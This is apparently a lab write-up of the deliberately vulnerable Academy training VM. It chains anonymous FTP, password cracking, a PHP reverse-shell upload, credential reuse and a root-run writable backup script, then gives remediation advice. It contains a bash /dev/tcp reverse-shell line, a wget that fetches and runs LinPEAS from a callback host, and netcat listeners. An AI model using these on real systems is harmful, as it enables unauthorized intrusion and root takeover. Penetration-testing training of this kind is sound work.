Academy

I investigated how exposed application data, a PHP upload and a privileged scheduled task connected across Academy’s trust boundaries.

Target environment

  • Target: Academy
  • Operating system: Debian GNU/Linux; captured kernel 4.19.0-16-amd64
  • Architecture: x86_64 (64-bit)
  • Service / application: FTP, SSH and an Academy PHP web application
  • Weakness investigated: Exposed credentials, executable upload and a writable backup script that runs as root
  • Scope: Intentionally vulnerable, isolated training VM

1. Enumerate services and retrieve the FTP note

My notes record an FTP service, so I checked it for anonymous access.

Placeholders such as <TARGET_IP> stand in for lab addresses.

sudo nmap -p- -sC -sV -T4 <TARGET_IP> -oN academy_nmap.txt

I logged into FTP anonymously, listed the directory and downloaded note.txt.

ftp <TARGET_IP>
ls
get note.txt
bye
cat note.txt

2. Recover access to the student application

The note held sensitive student/account details and a password hash. hash-identifier suggested MD5; Hashcat with a wordlist recovered the password in about a second, and I used it to log in to the student application. The hash and password are omitted.

hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 --show hashes.txt

I used FFUF to locate web directories; the notes identify /academy/ and its student profile image upload. The FFUF results are not reproduced.

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-u http://<TARGET_IP>/FUZZ -ac

3. Obtain a shell through the web service

The notes describe uploading a PHP reverse shell as a profile photo through the Academy PHP upload, then requesting it. The capture shows the callback and www-data identity, not the upload request.

nc -lvnp 1234
whoami
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

4. Enumerate files and switch to the local user

I ran LinPEAS; the reporting page identifies /home/grimmie/backup.sh and the web application’s database configuration.

cd /tmp
wget http://<CALLBACK_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

The configuration exposed a database credential, which the notes describe reusing to log in as grimmie over SSH; later captures show that account's shell. This is a same-host account change, not lateral movement. The configuration screenshot is excluded because it shows the password.

ssh grimmie@<TARGET_IP>
whoami
id
pwd

5. Trace and modify the privileged backup task

I used pspy64 to watch processes without root access. It shows UID=0 executing the backup script through Bash: a privileged task ran a script my less privileged account could change.

ls -l /home/grimmie/backup.sh
cat /home/grimmie/backup.sh
./pspy64

I edited the script and started a second listener:

nc -lvnp 8080
# In the grimmie session:
nano backup.sh
cat backup.sh

Captured modified script:

#!/bin/bash
bash -i >& /dev/tcp/<CALLBACK_IP>/8080 0>&1

6. Result and evidence limits

The callback shows whoami returning root; with the pspy capture and the modified script, it supports escalation through the scheduled backup task.

The Nmap/FFUF listings, upload HTTP exchange, Hashcat session and full LinPEAS run are not included. No remediation or retest was performed.

7. Attack path

  1. Anonymous FTP note
  2. Credential recovery
  3. Academy PHP upload
  4. www-data
  5. SSH as grimmie
  6. Writable backup script that runs as root
  7. Root

8. Findings and remediation

Attack / finding

Sensitive account information exposed through anonymous FTP

Anonymous access exposed a sensitive student/account note that led to credential recovery. The issue is unauthorized access to sensitive content, not the open FTP port itself.

Recommended defensive action

Remove sensitive files and backups from the anonymous area, and disable anonymous FTP if it isn't needed or confine it to a public-only directory. Reset exposed credentials and review the logs. Replace legacy fast password hashing with a vetted algorithm such as Argon2id. Encrypted file transfer protects data in transit but does not fix anonymous access.

Attack / finding

Executable profile upload

The documented PHP upload led to a captured www-data shell.

Recommended defensive action

Allowlist expected image formats, verify file contents, store uploads outside executable paths and prevent script execution in upload storage.

Attack / finding

Credential reuse

The notes describe moving from the web account to grimmie with a recovered configuration credential.

Recommended defensive action

Separate application/database and operating system credentials, restrict configuration access and rotate the exposed credential.

Attack / finding

Writable privileged script

Root executed a backup script modified by grimmie.

Recommended defensive action

Make privileged scripts and their parent directories writable only by their privileged owner, and run scheduled tasks with the least privilege they need.
